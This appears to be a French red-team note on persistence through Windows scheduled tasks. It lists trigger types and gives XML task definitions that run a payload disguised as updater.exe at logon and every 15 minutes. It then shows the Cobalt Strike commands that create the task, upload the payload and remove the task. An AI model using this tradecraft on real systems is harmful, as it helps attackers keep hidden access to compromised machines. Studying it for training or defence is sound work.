
Créer une simple tâche planifiée.

Ressources pour la définition des fichiers XML : 
- https://learn.microsoft.com/en-us/windows/win32/taskschd/task-scheduler-schema-elements
- https://learn.microsoft.com/en-us/windows/win32/taskschd/time-trigger-example--xml-


Triggers :

|Element|Derived from|Description|
|---|---|---|
|[**BootTrigger**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-boottrigger-triggergroup-element)|[**bootTriggerType**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-boottriggertype-complextype)|Specifies a trigger that starts a task when the system is booted.|
|[**CalendarTrigger**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-calendartrigger-triggergroup-element)|[**calendarTriggerType**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-calendartriggertype-complextype)|Specifies a daily, weekly, monthly, or a monthly day-of-the-week (DOW) trigger.|
|[**EventTrigger**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-eventtrigger-triggergroup-element)|[**eventTriggerType**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-eventtriggertype-complextype)|Specifies a trigger that starts a task when a system event occurs.|
|[**IdleTrigger**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-idletrigger-triggergroup-element)|[**idleTriggerType**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-idletriggertype-complextype)|Specifies a trigger that starts a task when the computer goes into an idle state.|
|[**LogonTrigger**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-logontrigger-triggergroup-element)|[**logonTriggerType**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-logontriggertype-complextype)|Specifies a trigger that starts a task when a user logs on.|
|[**RegistrationTrigger**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-registrationtrigger-triggergroup-element)|[**registrationTriggerType**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-registrationtriggertype-complextype)|Specifies a trigger that starts a task when the task is registered.|
|[**TimeTrigger**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-timetrigger-triggergroup-element)|[**timeTriggerType**](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-timetriggertype-complextype)|Specifies a trigger that starts a task when the trigger is activated.|

Exécution au Login d'un user

```
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>CONTOSO\pchilds</UserId>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <UserId>CONTOSO\pchilds</UserId>
    </Principal>
  </Principals>
  <Settings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec>
      <Command>%LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe</Command>
    </Exec>
  </Actions>
</Task>
```


Exécution toutes les 15 minutes.

```
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <Enabled>true</Enabled>
      <StartBoundary>2025-09-25T01:03:00</StartBoundary> 
      <Repetition>
		<Interval>PT15M</Interval>
		<Duration>P1D</Duration>
		<StopAtDurationEnd>false</StopAtDurationEnd>
	</Repetition>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <UserId>CONTOSO\pchilds</UserId>
    </Principal>
  </Principals>
  <Settings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
  </Settings>
  <Actions>
    <Exec>
      <Command>%LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe</Command>
    </Exec>
  </Actions>
</Task>
```


## Cobalt Strike

1. Créer un fichier XML sur notre machine locale qui définit notre tache planifiée exécutant %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe.

2. Créer la tache planifiée

```
schtaskscreate \Updater XML CREATE
```

3. Sélectionner notre fichier XML.

4. Upload updater.exe dans %LOCALAPPDATA%\Microsoft\WindowsApps\

```
cd %LOCALAPPDATA%\Microsoft\WindowsApps\
upload C:\Payloads\updater.exe
```




Supprimer la tache planifiée

```
schtasksdelete \Updater TASK
```